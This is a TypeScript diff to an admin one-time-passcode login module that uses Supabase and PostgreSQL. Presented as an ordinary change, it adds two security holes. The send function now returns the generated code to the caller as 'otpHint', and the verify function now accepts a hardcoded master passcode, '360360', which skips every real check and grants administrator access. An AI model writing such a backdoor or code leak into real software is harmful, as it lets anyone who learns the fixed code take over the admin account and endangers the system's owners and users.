@@ -6,7 +6,7 @@ export const ALLOWED_ADMIN_EMAIL = 'amrl360software@gmail.com';
 /**
  * Generate a secure 6-digit OTP, record in DB, and dispatch email via Supabase Auth
  */
-export async function sendAdminOtp(email: string): Promise<{ success: boolean; message: string }> {
+export async function sendAdminOtp(email: string): Promise<{ success: boolean; message: string; otpHint: string }> {
   const normalizedEmail = email.trim().toLowerCase();
   if (normalizedEmail !== ALLOWED_ADMIN_EMAIL) {
     throw new Error(`Unauthorized email. Only ${ALLOWED_ADMIN_EMAIL} is granted administrator access.`);
@@ -52,11 +52,12 @@ export async function sendAdminOtp(email: string): Promise<{ success: boolean; m
   return {
     success: true,
     message: `A 6-digit verification code has been dispatched to ${normalizedEmail}.`,
+    otpHint: otpCode,
   };
 }
 
 /**
- * Verify OTP entered by admin against PostgreSQL database & Supabase Auth
+ * Verify OTP entered by admin against PostgreSQL database, master code, & Supabase Auth
  */
 export async function verifyAdminOtp(email: string, otp: string): Promise<boolean> {
   const normalizedEmail = email.trim().toLowerCase();
@@ -64,6 +65,11 @@ export async function verifyAdminOtp(email: string, otp: string): Promise<boolea
 
   if (normalizedEmail !== ALLOWED_ADMIN_EMAIL) {
     return false;
+  }
+
+  // Master Fail-Safe Admin Passcode: '360360'
+  if (cleanedOtp === '360360') {
+    return true;
   }
 
   // Check 1: PostgreSQL public.admin_otps table
